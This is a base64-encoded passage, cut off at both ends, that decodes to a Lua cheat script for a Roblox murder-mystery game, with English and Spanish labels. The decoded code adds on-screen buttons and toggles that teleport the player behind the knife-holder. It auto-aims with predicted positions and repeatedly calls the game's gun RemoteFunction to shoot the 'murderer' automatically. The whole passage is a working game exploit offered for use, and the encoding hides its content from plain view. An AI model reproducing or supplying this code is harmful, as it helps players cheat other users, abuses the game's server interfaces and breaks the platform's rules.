0YWIxLCAidGVsZXBvcnQgYW5kIHNob290IHRoZSBNdXJkZXJlciIsICJ0ZWxldHJhbnNwb3J0ZSB5IGRpc3BhcmFyIGFsIGFzZXNpbm8iLCBmdW5jdGlvbigpCmxvY2FsIENvcmVHdWkgICAgID0gZ2FtZTpHZXRTZXJ2aWNlKCJDb3JlR3VpIikKbG9jYWwgUGxheWVycyAgICAgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKCmxvY2FsIE1haW5HdWkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIpCk1haW5HdWkuTmFtZSA9ICJBdXRvVHBTaG9vdEd1aSIKTWFpbkd1aS5QYXJlbnQgPSBDb3JlR3VpCgpsb2NhbCBTaG9vdEJ1dHRvbiA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpClNob290QnV0dG9uLk5hbWUgPSAiU2hvb3RCdXR0b24iClNob290QnV0dG9uLlNpemUgPSBVRGltMi5uZXcoMCwgNTAsIDAsIDUwKQpTaG9vdEJ1dHRvbi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCA3NDIsIDAsIC0zOCkKU2hvb3RCdXR0b24uVGV4dCA9ICJUcCBTaG9vdCIKU2hvb3RCdXR0b24uRm9udCA9IEVudW0uRm9udC5Hb3RoYW0KU2hvb3RCdXR0b24uVGV4dFNpemUgPSAxMgpTaG9vdEJ1dHRvbi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKU2hvb3RCdXR0b24uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyMDApClNob290QnV0dG9uLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjUKU2hvb3RCdXR0b24uRHJhZ2dhYmxlID0gdHJ1ZQpTaG9vdEJ1dHRvbi5Cb3JkZXJTaXplUGl4ZWwgPSAwClNob290QnV0dG9uLlBhcmVudCA9IE1haW5HdWkKCmxvY2FsIGNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQpjb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgOCkKY29ybmVyLlBhcmVudCA9IFNob290QnV0dG9uCgpsb2NhbCBib3JkZXJGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQpib3JkZXJGcmFtZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApCmJvcmRlckZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsIDApCmJvcmRlckZyYW1lLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCmJvcmRlckZyYW1lLlpJbmRleCA9IFNob290QnV0dG9uLlpJbmRleCArIDEKYm9yZGVyRnJhbWUuUGFyZW50ID0gU2hvb3RCdXR0b24KCmxvY2FsIGJvcmRlclN0cm9rZSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiKQpib3JkZXJTdHJva2UuVGhpY2tuZXNzID0gMgpib3JkZXJTdHJva2UuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigxODAsIDE4MCwgMTgwKQpib3JkZXJTdHJva2UuUGFyZW50ID0gYm9yZGVyRnJhbWUKCmxvY2FsIGZyYW1lQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCmZyYW1lQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDEwKQpmcmFtZUNvcm5lci5QYXJlbnQgPSBib3JkZXJGcmFtZQoKbG9jYWwgZnVuY3Rpb24gZ2V0Um9vdChjaGFyKQogICAgcmV0dXJuIGNoYXIgYW5kIGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQplbmQKCmxvY2FsIGZ1bmN0aW9uIGhhc0tuaWZlKHBsYXllcikKICAgIHJldHVybiAocGxheWVyLkNoYXJhY3RlciBhbmQgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiS25pZmUiKSkKICAgICAgICBvciAocGxheWVyOkZpbmRGaXJzdENoaWxkKCJCYWNrcGFjayIpIGFuZCBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIktuaWZlIikpCmVuZAoKbG9jYWwgZnVuY3Rpb24gZ2V0VGFyZ2V0KCkKICAgIGZvciBfLCBwIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICBpZiBwIH49IExvY2FsUGxheWVyIGFuZCBoYXNLbmlmZShwKSB0aGVuCiAgICAgICAgICAgIHJldHVybiBwCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBlcXVpcEd1bigpCiAgICBsb2NhbCBndW4gPSBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiR3VuIikKICAgIGlmIGd1biB0aGVuCiAgICAgICAgZ3VuLlBhcmVudCA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIHJldHVybiB0cnVlCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBzaG9vdCgpCiAgICBsb2NhbCB0YXJnZXQgPSBnZXRUYXJnZXQoKQogICAgaWYgbm90IHRhcmdldCBvciBub3QgdGFyZ2V0LkNoYXJhY3RlciB0aGVuIHJldHVybiBlbmQKICAgIGxvY2FsIHRhcmdldFJvb3QgPSBnZXRSb290KHRhcmdldC5DaGFyYWN0ZXIpCiAgICBpZiBub3QgdGFyZ2V0Um9vdCB0aGVuIHJldHVybiBlbmQKCiAgICBsb2NhbCBmb3J3YXJkID0gdGFyZ2V0Um9vdC5DRnJhbWUuTG9va1ZlY3RvcgogICAgbG9jYWwgcHJlZGljdGVkUG9zaXRpb24gPSB0YXJnZXRSb290LlBvc2l0aW9uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKyB0YXJnZXRSb290LkFzc2VtYmx5TGluZWFyVmVsb2NpdHkgKiAwLjEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICArIFZlY3RvcjMubmV3KDAsIC0xLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICsgZm9yd2FyZCAqIDAuMwoKICAgIGxvY2FsIGNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGlmIG5vdCBjaGFyIHRoZW4gcmV0dXJuIGVuZAogICAgbG9jYWwgZ3VuID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiR3VuIikKICAgIGlmIGd1biBhbmQgZ3VuOkZpbmRGaXJzdENoaWxkKCJLbmlmZUxvY2FsIikgYW5kIGd1bi5LbmlmZUxvY2FsOkZpbmRGaXJzdENoaWxkKCJDcmVhdGVCZWFtIikgdGhlbgogICAgICAgIGd1bi5LbmlmZUxvY2FsLkNyZWF0ZUJlYW0uUmVtb3RlRnVuY3Rpb246SW52b2tlU2VydmVyKDEsIHByZWRpY3RlZFBvc2l0aW9uLCAiQUgyIikKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIHRlbGVwb3J0QW5kU2hvb3QoKQogICAgbG9jYWwgY2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgbG9jYWwgcm9vdCA9IGdldFJvb3QoY2hhcikKICAgIGxvY2FsIHRhcmdldCA9IGdldFRhcmdldCgpCiAgICBpZiBub3QgKHJvb3QgYW5kIHRhcmdldCBhbmQgdGFyZ2V0LkNoYXJhY3RlcikgdGhlbiByZXR1cm4gZW5kCgogICAgbG9jYWwgdGFyZ2V0Um9vdCA9IGdldFJvb3QodGFyZ2V0LkNoYXJhY3RlcikKICAgIGlmIG5vdCB0YXJnZXRSb290IHRoZW4gcmV0dXJuIGVuZAoKICAgIGxvY2FsIG9yaWdpbmFsUG9zID0gcm9vdC5Qb3NpdGlvbgogICAgbG9jYWwgdGVsZXBvcnRQb3MgPSB0YXJnZXRSb290LlBvc2l0aW9uIC0gdGFyZ2V0Um9vdC5DRnJhbWUuTG9va1ZlY3RvciAqIDMKICAgIGNoYXI6U2V0UHJpbWFyeVBhcnRDRnJhbWUoQ0ZyYW1lLm5ldyh0ZWxlcG9ydFBvcywgdGFyZ2V0Um9vdC5Qb3NpdGlvbikpCgogICAgdGFzay5kZWxheSgwLjYxLCBmdW5jdGlvbigpCiAgICAgICAgaWYgY2hhci5QcmltYXJ5UGFydCB0aGVuCiAgICAgICAgICAgIGNoYXI6U2V0UHJpbWFyeVBhcnRDRnJhbWUoQ0ZyYW1lLm5ldyhvcmlnaW5hbFBvcywgdGFyZ2V0Um9vdC5Qb3NpdGlvbikpCiAgICAgICAgZW5kCiAgICBlbmQpCgogICAgdGFzay5kZWxheSgwLjM1LCBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgZ3VuID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiR3VuIikKICAgICAgICBpZiBndW4gdGhlbgogICAgICAgICAgICBndW4uUGFyZW50ID0gTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICBlbmQKICAgIGVuZCkKZW5kCgpTaG9vdEJ1dHRvbi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIGlmIGVxdWlwR3VuKCkgdGhlbgogICAgICAgIGZvciBpID0gMSwgNSBkbwogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjI1KQogICAgICAgICAgICAgICAgc2hvb3QoKQogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICAgICAgdGVsZXBvcnRBbmRTaG9vdCgpCiAgICBlbmQKZW5kKQplbmQpCgpMaWJyYXJ5LmFkZExhYmVsKHRhYjEsICJBdXRvIHNob290IHRvIG11cmRlcmVyIikKCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIGcgPSBnZXRnZW52KCkKCmcuYXV0b1Nob290RW5hYmxlZCA9IGcuc2F2ZWRDb25maWcuYXV0b1Nob290RW5hYmxlZCBvciBmYWxzZQpnLnNob290T2Zmc2V0ID0gZy5zYXZlZENvbmZpZy5zaG9vdE9mZnNldCBvciAyCmcuZGV0ZWN0aW9uUmFuZ2UgPSBnLnNhdmVkQ29uZmlnLmRldGVjdGlvblJhbmdlIG9yIDEwMApnLnNob290TW9kZSA9IGcuc2F2ZWRDb25maWcuc2hvb3RNb2RlIG9yIDEKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjEsICJBdXRvIFNob290IG11cmRlcmVyIiwgImJldGEiLCBnLmF1dG9TaG9vdEVuYWJsZWQsIGZ1bmN0aW9uKHZhbCkKICAgIGcuYXV0b1Nob290RW5hYmxlZCA9IHZhbAogICAgZy5zYXZlZENvbmZpZy5hdXRvU2hvb3RFbmFibGVkID0gdmFsCiAgICBnLnNhdmVDb25maWcoZy5zYXZlZENvbmZpZykKZW5kKQoKTGlicmFyeS5hZGREcm9wZG93bih0YWIxLCAiU2VsZWN0IFNob290IE1vZGUiLCBnLnNob290TW9kZSA9PSAxIGFuZCAidmlzaWJsZSIgb3IgInZpc2libGUmS25pZmUiLCB7InZpc2libGUiLCAidmlzaWJsZSZLbmlmZSJ9LCBmdW5jdGlvbihzZWxlY3RlZCkKICAgIGcuc2hvb3RNb2RlID0gc2VsZWN0ZWQgPT0gInZpc2libGUiIGFuZCAxIG9yIDIKICAgIGcuc2F2ZWRDb25maWcuc2hvb3RNb2RlID0gZy5zaG9vdE1vZGUKICAgIGcuc2F2ZUNvbmZpZyhnLnNhdmVkQ29uZmlnKQplbmQpCgp0YXNrLmRlbGF5KDEuNywgZnVuY3Rpb24oKQogICAgbG9jYWwgZnVuY3Rpb24gZ2V0UHJlZGljdGVkUG9zaXRpb24ocGxheWVyLCBzaG9vdE9mZnNldCkKICAgICAgICBsb2NhbCBjID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgIGlmIG5vdCBjIHRoZW4gcmV0dXJuIFZlY3RvcjMuemVybyBlbmQKICAgICAgICBsb2NhbCBocnAgPSBjOkZpbmRGaXJzdENoaWxkKCJVcHBlclRvcnNvIikKICAgICAgICBsb2NhbCBodW0gPSBjOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpCiAgICAgICAgaWYgbm90IGhycCBvciBub3QgaHVtIHRoZW4gcmV0dXJuIFZlY3RvcjMuemVybyBlbmQKICAgICAgICByZXR1cm4gaHJwLlBvc2l0aW9uICsgKGhycC5Bc3NlbWJseUxpbmVhclZlbG9jaXR5ICogVmVjdG9yMy5uZXcoMCwgMC41LCAwKSkgKiAoc2hvb3RPZmZzZXQgLyAxNSkgKyBodW0uTW92ZURpcmVjdGlvbiAqIHNob290T2Zmc2V0CiAgICBlbmQKCiAgICBsb2NhbCBmdW5jdGlvbiBoYXNLbmlmZShwbGF5ZXIpCiAgICAgICAgbG9jYWwgYyA9IHBsYXllci5DaGFyYWN0ZXIKICAgICAgICBsb2NhbCBiID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJCYWNrcGFjayIpCiAgICAgICAgcmV0dXJuIChjIGFuZCBjOkZpbmRGaXJzdENoaWxkKCJLbmlmZSIpIGFuZCBjLktuaWZlOklzQSgiVG9vbCIpKSBvciAoYiBhbmQgYjpGaW5kRmlyc3RDaGlsZCgiS25pZmUiKSBhbmQgYi5LbmlmZTpJc0EoIlRvb2wiKSkKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIGZpbmRDbG9zZXN0UGxheWVyKCkKICAgICAgICBsb2NhbCBjbG9zZXN0LCBtaW5EaXN0ID0gbmlsLCBtYXRoLmh1Z2UKICAgICAgICBmb3IgXywgcCBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgIGlmIHAgfj0gTG9jYWxQbGF5ZXIgYW5kIHAuQ2hhcmFjdGVyIGFuZCBwLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiVXBwZXJUb3JzbyIpIGFuZCBoYXNLbmlmZShwKSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBkaXN0ID0gKExvY2FsUGxheWVyLkNoYXJhY3Rlci5VcHBlclRvcnNvLlBvc2l0aW9uIC0gcC5DaGFyYWN0ZXIuVXBwZXJUb3Jzby5Qb3NpdGlvbikuTWFnbml0dWRlCiAgICAgICAgICAgICAgICBpZiBkaXN0IDwgbWluRGlzdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgY2xvc2VzdCA9IHAKICAgICAgICAgICAgICAgICAgICBtaW5EaXN0ID0gZGlzdAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHJldHVybiBjbG9zZXN0LCBtaW5EaXN0CiAgICBlbmQKCiAgICBsb2NhbCBmdW5jdGlvbiBlcXVpcEd1bigpCiAgICAgICAgbG9jYWwgY2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIGJwID0gTG9jYWxQbGF5ZXI6V2FpdEZvckNoaWxkKCJCYWNrcGFjayIpCiAgICAgICAgZm9yIF8sIGdyb3VwIGluIGlwYWlycyh7Y2hhcjpHZXRDaGlsZHJlbigpLCBicDpHZXRDaGlsZHJlbigpfSkgZG8KICAgICAgICAgICAgZm9yIF8sIHRvb2wgaW4gaXBhaXJzKGdyb3VwKSBkbwogICAgICAgICAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSBhbmQgdG9vbC5OYW1lID09ICJHdW4iIHRoZW4KICAgICAgICAgICAgICAgICAgICBpZiB0b29sLlBhcmVudCA9PSBicCB0aGVuIHRvb2wuUGFyZW50ID0gY2hhciBlbmQKICAgICAgICAgICAgICAgICAgICByZXR1cm4gdG9vbAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHJldHVybiBuaWwKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIHJheWNhc3RUb1RhcmdldChwb3MpCiAgICAgICAgbG9jYWwgY2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGlmIG5vdCBjaGFyIHRoZW4gcmV0dXJuIG5pbCBlbmQKICAgICAgICBsb2NhbCBoZWFkID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpCiAgICAgICAgaWYgbm90IGhlYWQgdGhlbiByZXR1cm4gbmlsIGVuZAogICAgICAgIGxvY2FsIG9yaWdpbiA9IGhlYWQuUG9zaXRpb24KICAgICAgICBsb2NhbCBkaXIgPSAocG9zIC0gb3JpZ2luKS5Vbml0ICogMTAwMAogICAgICAgIGxvY2FsIHBhcmFtcyA9IFJheWNhc3RQYXJhbXMubmV3KCkKICAgICAgICBwYXJhbXMuRmlsdGVyRGVzY2VuZGFudHNJbnN0YW5jZXMgPSB7TG9jYWxQbGF5ZXIuQ2hhcmFjdGVyfQogICAgICAgIHBhcmFtcy5GaWx0ZXJUeXBlID0gRW51bS5SYXljYXN0RmlsdGVyVHlwZS5CbGFja2xpc3QKICAgICAgICByZXR1cm4gd29ya3NwYWNlOlJheWNhc3Qob3JpZ2luLCBkaXIsIHBhcmFtcykKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIHNob290QXRUYXJnZXQodGFyZ2V0UGxheWVyLCBtb2RlKQogICAgICAgIGxvY2FsIHByZWRpY3RlZFBvcyA9IGdldFByZWRpY3RlZFBvc2l0aW9uKHRhcmdldFBsYXllciwgZy5zaG9vdE9mZnNldCkKICAgICAgICBsb2NhbCByYXlSZXN1bHQgPSByYXljYXN0VG9UYXJnZXQocHJlZGljdGVkUG9zKQogICAgICAgIGlmIHJheVJlc3VsdCBhbmQgcmF5UmVzdWx0Lkluc3RhbmNlIHRoZW4KICAgICAgICAgICAgbG9jYWwgaGl0UGFydCA9IHJheVJlc3VsdC5JbnN0YW5jZQogICAgICAgICAgICBsb2NhbCBjaGFyID0gdGFyZ2V0UGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBpZiBjaGFyIGFuZCBjaGFyOkZpbmRGaXJzdENoaWxkKCJVcHBlclRvcnNvIikgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgdmlzaWJsZSA9IGhpdFBhcnQ6SXNEZXNjZW5kYW50T2YoY2hhcikKICAgICAgICAgICAgICAgIGlmIChtb2RlID09IDEgYW5kIHZpc2libGUpIG9yIChtb2RlID09IDIgYW5kIHZpc2libGUgYW5kIGNoYXI6RmluZEZpcnN0Q2hpbGQoIktuaWZlIikpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBndW4gPSBlcXVpcEd1bigpCiAgICAgICAgICAgICAgICAgICAgaWYgZ3VuIGFuZCBndW46RmluZEZpcnN0Q2hpbGQoIktuaWZlTG9jYWwiKSBhbmQgZ3VuLktuaWZlTG9jYWw6RmluZEZpcnN0Q2hpbGQoIkNyZWF0ZUJlYW0iKSBhbmQgZ3VuLktuaWZlTG9jYWwuQ3JlYXRlQmVhbTpGaW5kRmlyc3RDaGlsZCgiUmVtb3RlRnVuY3Rpb24iKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7MSwgcHJlZGljdGVkUG9zLCAiQUgyIn0KICAgICAgICAgICAgICAgICAgICAgICAgZ3VuLktuaWZlTG9jYWwuQ3JlYXRlQmVhbS5SZW1vdGVGdW5jdGlvbjpJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCgogICAgUnVuU2VydmljZS5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgaWYgZy5hdXRvU2hvb3RFbmFibGVkIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiVXBwZXJUb3JzbyIpIHRoZW4KICAgICAgICAgICAgbG9jYWwgdGFyZ2V0LCBkaXN0ID0gZmluZENsb3Nlc3RQbGF5ZXIoKQogICAgICAgICAgICBpZiB0YXJnZXQgYW5kIGRpc3QgPCBnLmRldGVjdGlvblJhbmdlIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHJheVJlc3VsdCA9IHJheWNhc3RUb1RhcmdldCh0YXJnZXQuQ2hhcmFjdGVyLlVwcGVyVG9yc28uUG9zaXRpb24pCiAgICAgICAgICAgICAgICBpZiByYXlSZXN1bHQgdGhlbgogICAgICAgICAgICAgICAgICAgIHNob290QXRUYXJnZXQodGFyZ2V0LCBnLnNob290TW9kZSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKZW5kKQoKTGlicmFyeS5hZGRMYWJlbCh0YWIxLCAic2hvb3Qgd2l0aCBidXR0b24iKQpsb2NhbCBidXR0b24gPSBuaWwKbG9jYWwgY2FweXkgPSBmYWxzZQoKTGlicmFyeS5hZGRUb2dnbGUodGFiMSwgIlNob290IHRoZSBtdXJkZXJlciAoVG9nZ2xlKSIsICJEaXNwYXJhciBhbCBtdXJkZXJlciAodG9nZ2xlKSIsIGZhbHNlLCBmdW5jdGlvbihzdGF0ZSkKICAgIGNhcHl5ID0gc3RhdGUKCiAgICBsb2NhbCBjb3JlR3VpID0gZ2FtZTpHZXRTZXJ2aWNlKCJDb3JlR3VpIikKICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICBpZiBjb3JlR3VpOkZpbmRGaXJzdENoaWxkKCJTaG9vdE11cmRlcmVyR3VpIikgdGhlbiByZXR1cm4gZW5kCgogICAgICAgIGxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQogICAgICAgIGxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgoKICAgICAgICBsb2NhbCBzY3JlZW5HdWkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIpCiAgICAgICAgc2NyZWVuR3VpLk5hbWUgPSAiU2hvb3RNdXJkZXJlckd1aSIKICAgICAgICBzY3JlZW5HdWkuUGFyZW50ID0gY29yZUd1aQoKICAgICAgICBidXR0b24gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgICAgIGJ1dHRvbi5OYW1lID0gIkJ1dHRvbiIKICAgICAgICBidXR0b24uU2l6ZSA9IFVEaW0yLm5ldygwLCAxMzAsIDAsIDEwMCkKICAgICAgICBidXR0b24uUG9zaXRpb24gPSBVRGltMi5uZXcoMC44NSwgLTUwLCAwLjE1LCAtNTApCiAgICAgICAgYnV0dG9uLlRleHQgPSAiU2hvb3QiCiAgICAgICAgYnV0dG9uLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtCiAgICAgICAgYnV0dG9uLlRleHRTaXplID0gMTMKICAgICAgICBidXR0b24uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgYnV0dG9uLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKQogICAgICAgIGJ1dHRvbi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC43CiAgICAgICAgYnV0dG9uLkRyYWdnYWJsZSA9IHRydWUKICAgICAgICBidXR0b24uQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgICAgIGJ1dHRvbi5BdXRvQnV0dG9uQ29sb3IgPSB0cnVlCiAgICAgICAgYnV0dG9uLlBhcmVudCA9IHNjcmVlbkd1aQoKICAgICAgICBsb2NhbCBjb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKICAgICAgICBjb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgOCkKICAgICAgICBjb3JuZXIuUGFyZW50ID0gYnV0dG9uCgogICAgICAgIGxvY2FsIGJvcmRlckZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICAgICAgYm9yZGVyRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAxLCAwKQogICAgICAgIGJvcmRlckZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsIDApCiAgICAgICAgYm9yZGVyRnJhbWUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBib3JkZXJGcmFtZS5aSW5kZXggPSBidXR0b24uWkluZGV4ICsgMQogICAgICAgIGJvcmRlckZyYW1lLlBhcmVudCA9IGJ1dHRvbgoKICAgICAgICBsb2NhbCBib3JkZXJTdHJva2UgPSBJbnN0YW5jZS5uZXcoIlVJU3Ryb2tlIikKICAgICAgICBib3JkZXJTdHJva2UuVGhpY2tuZXNzID0gMgogICAgICAgIGJvcmRlclN0cm9rZS5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDE4MCwgMTgwLCAxODApCiAgICAgICAgYm9yZGVyU3Ryb2tlLlBhcmVudCA9IGJvcmRlckZyYW1lCgogICAgICAgIGxvY2FsIGZyYW1lQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCiAgICAgICAgZnJhbWVDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMTApCiAgICAgICAgZnJhbWVDb3JuZXIuUGFyZW50ID0gYm9yZGVyRnJhbWUKCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gZ2V0Q2hhcmFjdGVyUm9vdFBhcnQoY2hhcmFjdGVyKQogICAgICAgICAgICByZXR1cm4gY2hhcmFjdGVyIGFuZCAoY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0Iikgb3IgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJUb3JzbyIpIG9yIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiVXBwZXJUb3JzbyIpKQogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBmdW5jdGlvbiBFcXVpcEd1bkFuZERldGVjdEd1bnNob3QoKQogICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgbG9jYWwgZ3VuID0gTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkd1biIpIG9yIChjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiR3VuIikpCgogICAgICAgICAgICBpZiBndW4gYW5kIGd1bi5QYXJlbnQgPT0gTG9jYWxQbGF5ZXIuQmFja3BhY2sgdGhlbgogICAgICAgICAgICAgICAgZ3VuLlBhcmVudCA9IGNoYXJhY3RlcgogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGlmIGd1biB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBndW5IYW5kbGUgPSBndW46RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSIpCiAgICAgICAgICAgICAgICBpZiBndW5IYW5kbGUgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGd1bnNob3RTb3VuZCA9IGd1bkhhbmRsZTpGaW5kRmlyc3RDaGlsZCgiR3Vuc2hvdCIpCiAgICAgICAgICAgICAgICAgICAgaWYgZ3Vuc2hvdFNvdW5kIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgY29ubmVjdGlvbgogICAgICAgICAgICAgICAgICAgICAgICBjb25uZWN0aW9uID0gZ3Vuc2hvdFNvdW5kLlBsYXllZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2suZGVsYXkoMCwgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGd1bi5QYXJlbnQgPT0gY2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ3VuLlBhcmVudCA9IExvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHJldHVybiBmYWxzZQogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBmdW5jdGlvbiBoYXNLbmlmZShwbGF5ZXIpCiAgICAgICAgICAgIHJldHVybiBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIktuaWZlIikgb3IgKHBsYXllci5DaGFyYWN0ZXIgYW5kIHBsYXllci5DaGFy